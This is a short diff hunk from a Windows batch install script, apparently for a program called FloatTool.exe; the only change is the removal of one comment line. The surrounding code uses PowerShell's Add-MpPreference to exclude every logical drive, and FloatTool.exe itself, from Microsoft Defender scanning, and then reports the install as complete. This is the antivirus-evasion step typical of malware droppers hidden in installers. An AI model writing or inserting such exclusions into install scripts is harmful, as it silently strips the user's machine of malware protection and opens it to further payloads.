@@ -17,7 +17,6 @@ for /f "tokens=1 delims=:" %%d in ('wmic logicaldisk get caption ^| findstr /r "
     powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%%d\'}"
 )
 
-REM Add FloatTool.exe to the exclusion list
 powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%~dp0FloatTool.exe'}"
 
 echo Install Complete
